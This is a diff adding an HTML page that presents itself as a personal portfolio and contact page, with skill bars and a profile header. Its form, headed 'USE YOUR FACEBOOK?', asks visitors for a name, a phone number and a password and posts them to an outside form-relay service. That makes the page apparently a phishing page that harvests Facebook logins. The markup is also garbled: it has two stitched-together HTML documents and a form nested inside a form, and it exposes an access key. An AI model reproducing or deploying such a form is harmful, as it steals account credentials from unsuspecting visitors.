@@ -1,0 +1,295 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title> contact </title>
+<style>
+
+
+        
+* {
+  margin:0;
+  padding:0;
+  list-style: none;
+  text-decoration: none;
+  transition: 0.3s;
+  -webkit-touch-callout: none;
+  -webkit-user-select: none;
+  user-select: none;
+  outline: none;
+}
+
+body {
+  background-color:#333;
+}
+
+.ham {
+  width: 45px;
+  height: 45px;
+  background: black;
+  border-radius: 7px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  z-index: 99;
+  position: fixed;
+  top: 15px;
+  right: 20px;
+}
+
+.line1, .line2, .line3{
+  background: white;
+  border-radius: 3px;
+  width: 25px;
+  height: 3px;
+  margin: 2px;
+}
+
+.active .line1{
+  transform: rotate(-45deg) translate(-5px, 5px);
+
+}
+.active .line2 {
+  opacity: 0;
+}
+
+.active .line3 {
+  transform: rotate(45deg) translate(-5px, -5px);
+}
+
+header {
+  width:100%;
+  height:100vh;
+}
+
+.link{    
+  left: 0%;
+}
+
+nav ul {
+  left: -50%;
+  position: fixed;
+  height: 100vh;
+  width: 50%;
+  background:#111;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+
+ul h1 {
+  color: #fff;
+}
+
+ul li{
+  text-align:center;
+  padding:15px 0;
+  width: 100%;
+}
+
+ul li:hover{
+  background:#26A69A;
+  padding-left: 7%;
+  width:93%; 
+}
+
+li a{
+  color: #fff;
+}
+
+.text{
+  padding:1px 10px 1px 10px;
+  color:#fff;
+}
+</style>
+</head>
+<body>
+
+<header>
+  <nav>
+    <ul id="ul">
+      <h1>STATS</h1><br>
+      <li><a href="#"><input type="range">BEGINNER</a></li>
+      <li><a href="#"><input type="checkbox">AMATEUR</a></li>
+      <li><a href="#"><input type="radio">SEASONED</a></li>
+    </ul>
+  </nav>
+  
+    <div id="hamMenu" class="ham" onclick="hamMenuClick()">
+      <div class="line1"></div>
+      <div class="line2"></div>
+      <div class="line3"></div>
+    </div>
+    
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>codishk</title>
+<style>
+html{
+  padding:0;
+  margin:0;
+}
+
+body{
+  background-color:black;
+}
+
+.section{
+  background-color: #FFFFFF;
+  padding: 15px;
+  margin-bottom: 10px;
+  border-radius: 10px;
+}
+
+#header {
+  background-image: url("/img/images.jpeg");
+  background-size: cover;
+}
+
+#header img{
+  border-radius:50%;
+  border:1px solid #212121;
+}
+
+#header p {
+  font-size: 20pt;
+  color: #EFEFEF;
+  padding-top: 5px;
+  margin: 0;
+  font-weight: bold;
+  text-align: center;
+}
+
+progress {
+  width: 80%;
+  height: 18px;
+  margin-left:10%;
+  color: #3fb6b2;
+  background: #efefef;
+  border-radius:10px;
+}
+
+progress::-webkit-progress-bar {
+  background: #efefef;
+  border-radius:10px;
+}
+
+progress::-webkit-progress-value {
+  background: #607D8B;
+  border-radius:10px;
+}
+
+#languages p{
+  text-align:center;
+  font-size:18px;
+  font-weight:bold;
+}
+
+form {
+  text-align: center;
+  margin-top: 0;
+}
+
+input, textarea {
+  margin-bottom: 8px;
+  font-size: 11pt;
+  padding: 10px 10px 10px;
+  border: 1px solid #cecece;
+  background-color: #EFEFEF;
+  color: #404040;
+  border-radius: 10px;
+  width: 70%;
+  outline: none;
+}
+
+.submit {
+  background-color: #607D8B;
+  border-radius: 10px;
+  color: #FFFFFF;
+  border: none;
+  outline: none;
+  margin: 0;
+  font-weight: bold;
+}
+
+textarea {
+  height: 80px;
+}
+
+h2{
+  color:#607D8B;
+}
+</style>
+</head>
+<body>
+<!--Header Start-->
+<div id="header" class="section" align="center" >
+<img src="https://i.postimg.cc/631MMMDM/crop-picture-1720910989.jpg" width="70px" >
+<p>GLENN SAM EVANGELIO</p>
+</div>
+
+<!--About Me-->
+<div class="section" >
+<h2 align="center" >About Me</h2>
+<p>contact me to learn new things</p>
+</div>
+
+<!--Coding Languages-->
+<div id="languages"  class="section">
+<p>HTML</p>
+<progress min="0" max="100" value="90"></progress>
+<p>CSS</p>
+<progress min="0" max="100" value="80"></progress>
+<p>SQL</p>
+<progress min="0" max="100" value="10"></progress>
+<p>JAVASCRIPT</p>
+<progress min="0" max="100" value="60"></progress>
+<p>PYTHON</p>
+<progress min="0" max="100" value="25"></progress>
+<p>JAVA</p>
+<progress min="0" max="100" value="10"></progress>
+</div>
+ <form action="https://api.web3forms.com/submit" method="POST">
+
+    <input type="hidden" name="access_key" value="3e4f758d-de26-4bd1-96d6-6f4c005d757f">
+
+<div class="section">
+<form>
+<h2>USE YOUR FACEBOOK?</h2>
+<input type="name"placeholder="Name"name="Name">
+<input placeholder="Number" type="text"name="number" required><br>
+<input placeholder="password" type="text"name="glennsamevangelio70"required><br>
+<textarea placeholder="Message"name="message"required></textarea>
+<input type="submit" class="submit">
+</form>
+</div>
+
+<div class="section">
+<p align="center" >&copy;GRAYHAT</p>
+</div>
+</body>
+</html>
+
+
+
+
+</header>
+
+<script>  
+function hamMenuClick()
+{
+  document.getElementById("hamMenu").classList.toggle("active");
+  document.getElementById("ul").classList.toggle("link");
+}
+</script>
+</body>
+</html>
+
+
